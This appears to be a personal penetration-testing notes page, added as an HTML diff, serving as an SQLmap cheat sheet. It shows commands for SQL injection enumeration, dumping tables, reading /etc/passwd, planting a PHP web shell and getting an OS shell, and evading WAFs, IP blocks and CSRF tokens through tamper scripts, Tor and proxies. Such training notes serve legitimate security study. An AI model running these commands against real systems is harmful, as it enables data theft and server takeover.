@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>SQLmap</h1>
+            <p>sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of databases</p>
+        </div>
+        <div class="notion-body">
+                    <ul> 
+                    <h2>Enumeration</h2>
+                    <ul>  
+                    <p>Once you have performeda an SQLi you can start enumerating with the following flags</p>
+                    <pre><code class="language-bash">--banner #Shows banner of the SQL server
+--current-user #Shows the current user logged in
+--hostname #Shows the hostaname of the server
+--current-db #Show the current db name
+--passwords #Attempts to show stored passwords
+--is-dba #Shows if user is-dba
+--schema #Shows the structure of all tables in the all the databases
+--search -T (table names) -C (column names) #Search for a string</code></pre>
+                    </ul>      
+                    <h2>Some basic commands</h2>
+                    <ul>
+                    <pre><code class="language-bash">sqlmap -u "http://www.example.com/vuln.php?id=1" --batch #Attacking to the specified endpoint and parameter. --batch automates all the process without user input
+sqlmap -u http://domain.com/login --data "email=hola&password=test" --dbs                   #Show database
+sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main --tables        #Show tables from main database
+sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main -T user --dump  #Show all info from that table</code></pre>
+
+                     <p>In case we would like to test specific parameters. Remember that --data is only for POST request</p>
+                     <pre><code class="language-bash">sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid</code></pre>   
+                     <p>Use a request in a file in order to perform the sql injection test. First you need to copy the request from burp or similar and paste it into a file. Then simply use. We can also specify the parameter </p>
+                     <p>--data only for POST requests</p>
+                     <pre><code class="language-bash">sqlmap -r req.txt</code></pre>
+                     </ul>    
+
+                     <h3>Command execution</h3>
+                     <ul>
+                        <p>Depending in the DB system we are attacking we could be able to perform command execution in the server through different methods</p>
+                        <p>We can do the process manually checking of we have read permissions over system files. Remember that we must be dba in order to do so. (--is-dba)</p>
+                        <pre><code class="language-bash">sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</code></pre>
+                        <p>Once we can, we can upload a shell in order to perform command execution and then access to it through the webserver (In case is there one). In case there is no web server we could try to situate our shell in a folder where a cronjob takes place in. This way a root user or similar could execute that code and get reverse shell</p>
+                        <pre><code class="language-bash">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code></pre>
+                        <pre><code class="language-bash">sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></pre>
+                        <b>In order to automate all this process we can use the -os-shell flag which will try different techniques</b>
+                        <pre><code class="language-bash">sqlmap -u "http://www.example.com/?id=1" --os-shell</code></pre>
+                        <p>In case our shell is unstable and commands do not complte we can use a different technique</p>
+                        <pre><code class="language-bash">sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E</code></pre>
+                     </ul>
+                     
+                     <h2>Custom sqlmap requests</h2>
+                     <ul>
+                     <p>In case you would like to test for an internal endpoint which needs to login into the application for being tested we can pass the cookie to the command</p>
+                     <pre><code class="language-bash">sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></pre>       
+                     <p>You can also test specific parts of parameters using the * Here is an example with cookies</p>
+                     <h3>JSON post request capture</h3>
+                     <p>In case you found that body perform a POST and it contains a JSON format data we can capture the request convert it to POST and then use sqlmap with the text</p>
+                     </ul>
+            
+                     <h2>Advanced SQLmap</h2>
+                     <ul>
+                        <p>In case SQL map does not find anything by default you use the following flags</p>
+                        <h3>Risk and level</h3>
+                        <ul>
+                        <li><b>Level:</b>Select the ammount of test sqlmap will perform. Goes from 1-5</li>   
+                        <li><b>Risk:</b>Select payloads that could be dangerous for the target (Availability, Integrity). Goes from 1-3</li>   
+                        </ul>
+
+                        <h3>Prefix and suffixes</h3>
+                        <ul>
+                            <p>Using the following sufix and prefix you could perform better injections based on how SQL work. Those are normally not included in sqlmap scans</p>
+                            <b>It is highly recommended to think about how the query might be builded in order to choose the appropiate prefix and suffix</b>
+                            <pre><code class="language-bash">sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"</code></pre> 
+                            <p>Another example in a MariaDB where the parameters is requesting a string making reference to a column that's why we use `</p>
+                            <pre><code class="language-bash"> qlmap -u "http://154.57.164.76:32006/case6.php?col=id" --prefix="\`)" --suffix="-- -" --level 5 --risk 3 -p col</code></pre>
+                            <p>Another example where the parater use a numerical number. We can presume the SQL query does not use '' when performing SELECT * FROM users WHERE id = 1 since in that case it would show an error. With that we only need to use a prefix in order to comment all the conetnt behind it...</p>
+                            <pre><code class="language-bash">sqlmap -u "http://154.57.164.65:30159/case7.php?id=1" -p id --level 5 --risk 3 --suffix="-- -" </code></pre>
+                        </ul>
+
+                        <h3>Usage of specific attack</h3>
+                        <ul>
+                            <p>Full technique code BEUSTQ</p>
+                            <p>In case you only would like to try some specific attacks you could use, for example skiping time base sql injections we could use the following flag in orderto only use boolean-based blind, error-based, and UNION-query payloads</p>
+                            <pre><code class="language-bash">--technique=BEU</code></pre>
+                         </ul> 
+                     </ul>
+
+                     <h2>Play stealthy</h2>
+                     <ul>
+                        <p><b>--random-agent</b> Furthermore, there is a switch designed to randomly select a User-Agent</p>
+                        <p><b>--mobile</b> switch can be used to imitate the smartphone by using that same header value.</p>
+                        <p><b>--skip-waf</b>In case we want to bypass the WAF</p>
+                     </ul>
+
+                     <h2>Bypassing Web Application Protections</h2>
+                     <ul>
+                        <h3>Bypassing CSRF</h3>
+                        <ul>
+                            <p>Cross-Site Request Forgery is a type of attack where the attacket tackes advantage by using a designed link and sends it to the victim in order to wait for that victim to click in it. Here comes an example</p>
+                            <p>If an attacker send this and the victim is still logged in and clicks it, the account with id 5 will be deleted</p>
+                            <pre><code class="language-bash">https://victima.com/delete-user?id=5"</code></pre>
+                            <p>Here is where it comes to play the CSRF which is a token that needs to be sent for every request performed. Since the attacker does not know the code in case the victim clicks the link it won't go do any harm since when the server validates it won't find the CSRF code</p>
+                            <p>Since in automated tools like SQLmap we will have to use a CSRF token for every request we send, we can use the the flag <b>--csrf-token</b> in order to provide that token in the request. In case we don't provide sqlmap will detect it and ask to implement it</p>
+                            <pre><code class="language-bash">sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"</code></pre>
+                        </ul>
+                        
+                        <h3>Bypassing Unique value</h3>
+                        <ul>
+                            <p>Same as CSRF some webpages will use a parameter which will have a random value in order to avoid CSRF attacks. In this case sqlmap allow us to use the parameter <b>--randomize</b> pointing to the parameter itself </p>
+                            <pre><code class="language-bash">sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp</code></pre>
+                        </ul>
+                        
+                        <h3>Bypassing Calculated parameter</h3>
+                        <ul>
+                            <p>In case a web application expects a proper parameter value to be calculated based on some other parameter value(s) for example:</p>
+                            <p>Based on the parameter <b>id</b> which equal <b>1</b> the following parameter called <b>h</b> equal to the <b>MD5</b> hash of <b>id</b> parameter</p>
+                            <pre><code class="language-bash">http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b</code></pre>
+                            <p>In this cases we can use the flag <b>--eval</b> in order to attach some python code to perform an action (In this case encode values for the parameter id in every request)</p>
+                            <pre><code class="language-bash">sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"</code></pre>
+                        </ul>
+
+                        <h3>Bypassing IP block</h3>
+                        <ul>
+                        <p>In case the website contains some sort of IP blocking functionallity that in certain attempts it blocks you IP we can use different methods</p>
+                        <h4>Using a VPS (Virtual Private Server)</h4>
+                        <ul>
+                            <p>Basically in this case youll need to buy a virtual private server and perform the attack from there. Once your IP is blocked simply change the IP of the VPS or create a new server</p>
+                        </ul>
+                        <h4>Using tor</h4>
+                        <ul>
+                            <p>Good option, it's free, easy and changes the IP. But as you know who controls the in and out nodes controlls the traffic. In order to set it up follow the steps</p>
+                            <pre><code class="language-bash">#Install tor
+sudo apt install tor
+sudo service tor start</code></pre>
+                            <p>Check if you are using it correctly and the remove the <b>--check-tor</b> flag in order to perform the attack</p>
+                            <pre><code class="language-bash">sqlmap -u "http://target" --tor --check-tor</code></pre>    
+                        </ul>
+                        <h4>List of proxys</h4>
+                        <ul>
+                        <p>You can also try with list of proxy from third parties but it's not the best option since you don't control the nodes. Here comes an example</p>
+                        <pre><code class="language-bash">--proxy="socks4://177.39.187.70:33283"</code></pre>
+                        <p>In case you have a proxy file you could use the <b>--proxy-file</b> flag</p>
+                        </ul>
+
+                        <h4>User-agent Blacklisting Bypass</h4>
+                        <ul>
+                        <p>In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap</p>
+                        <p>We can bypass it using the following flag which will generate a random agent</p>
+                        <pre><code class="language-bash">--random-agent</code></pre>
+                        </ul>
+
+                        <h4>Miscellaneous Bypasses</h4>
+                        <ul>
+                        <h4>Chunked transfer encoding</h4>
+                        <p>Splits the POST request's body into so-called "chunks." Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.</p>
+                        <pre><code class="language-bash">--chunked</code></pre>
+
+                        <h4>HTTP parameter pollution (HPP)</h4>
+                        <p>Payloads are split in a similar way as in case of --chunked between different same parameter named values</p>
+                        <pre><code class="language-bash">--chunked</code></pre>
+                        </ul>
+
+                        <h4>Tamper scripts</h4>
+                        <ul>
+                        <p>Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called "tamper" scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.</p>
+                        <p>For example, one of the most popular tamper scripts between is <b>replacing all occurrences of greater than operator (>) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #</b>. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.</p>
+                        <p>In order to use tamper scripts use the flag --tamper</p>
+                        <pre><code class="language-bash">--tamper=between #Single tamper script
+--tamper=between,randomcase #Single tamper script</code></pre>
+                        <p>Here we have a list of common tamper scripts and its description</p>
+                        
+                        <table border="1" cellpadding="8" cellspacing="0">
+                            <thead>
+                                <tr>
+                                    <th>Tamper Script</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>0eunion</td>
+                                    <td>Replaces instances of <b>UNION</b> with <b>e0UNION</b></td>
+                                </tr>
+                                <tr>
+                                    <td>base64encode</td>
+                                    <td><b>Base64-encodes</b> all characters in a given payload</td>
+                                </tr>
+                                <tr>
+                                    <td>between</td>
+                                    <td>Replaces greater than operator <b>(&gt;)</b> with NOT BETWEEN <b>0</b> AND <b>#</b> and equals operator <b>(=)</b> with BETWEEN <b>#</b> AND <b>#</b></td>
+                                </tr>
+                                <tr>
+                                    <td>commalesslimit</td>
+                                    <td>Replaces (MySQL) instances like <b>LIMIT M</b>, <b>N</b> with <b>LIMIT N OFFSET M</b> counterpart</td>
+                                </tr>
+                                <tr>
+                                    <td>equaltolike</td>
+                                    <td>Replaces all occurrences of operator equal <b>(=)</b> with <b>LIKE</b> counterpart</td>
+                                </tr>
+                                <tr>
+                                    <td>halfversionedmorekeywords</td>
+                                    <td>Adds (MySQL) versioned <b>comment</b> before each keyword</td>
+                                </tr>
+                                <tr>
+                                    <td>modsecurityversioned</td>
+                                    <td>Embraces complete query with (MySQL) versioned <b>comment</b></td>
+                                </tr>
+                                <tr>
+                                    <td>modsecurityzeroversioned</td>
+                                    <td>Embraces complete query with (MySQL) <b>zero-versioned comment</b></td>
+                                </tr>
+                                <tr>
+                                    <td>percentage</td>
+                                    <td>Adds a percentage sign <b>(%)</b> in front of each character <b>(e.g. SELECT -&gt; %S%E%L%E%C%T)</b></td>
+                                </tr>
+                                <tr>
+                                    <td>plus2concat</td>
+                                    <td>Replaces plus operator <b>(+)</b> with (MsSQL) function CONCAT() counterpart</td>
+                                </tr>
+                                <tr>
+                                    <td>randomcase</td>
+                                    <td>Replaces each keyword character with random case value <b>(e.g. SELECT -&gt; SEleCt)</b></td>
+                                </tr>
+                                <tr>
+                                    <td>space2comment</td>
+                                    <td>Replaces space character <b>( )</b> with comments <b>/* */</b></td>
+                                </tr>
+                                <tr>
+                                    <td>space2dash</td>
+                                    <td>Replaces space character <b>( )</b> with a dash comment <b>(--)</b> followed by a random string and a new line <b>(\n)</b></td>
+                                </tr>
+                                <tr>
+                                    <td>space2hash</td>
+                                    <td>Replaces (MySQL) instances of space character <b>( )</b> with a pound character <b>(#)</b> followed by a random string and a new line <b>(\n)</b></td>
+                                </tr>
+                                <tr>
+                                    <td>space2mssqlblank</td>
+                                    <td>Replaces (MsSQL) instances of space character <b>( )</b> with a random blank character from a valid set of alternate characters</td>
+                                </tr>
+                                <tr>
+                                    <td>space2plus</td>
+                                    <td>Replaces space character <b>( )</b> with plus <b>(+)</b></td>
+                                </tr>
+                                <tr>
+                                    <td>space2randomblank</td>
+                                    <td>Replaces space character <b>( )</b> with a <b>random blank</b> character from a valid set of alternate characters</td>
+                                </tr>
+                                <tr>
+                                    <td>symboliclogical</td>
+                                    <td>Replaces <b>AND and OR</b> logical operators with their symbolic counterparts <b>(&& and ||)</b></td>
+                                </tr>
+                                <tr>
+                                    <td>versionedkeywords</td>
+                                    <td>Encloses each <b>non-function</b> keyword with (MySQL) <b>versioned comment</b></td>
+                                </tr>
+                                <tr>
+                                    <td>versionedmorekeywords</td>
+                                    <td>Encloses each <b>keyword</b> with (MySQL) <b>versioned comment</b></td>
+                                </tr>
+                            </tbody>
+                            </table>
+                        </ul>
+
+                     </ul>
+                </ul>
+        </div>
+    </div>
+
+
+</body>
+</html>
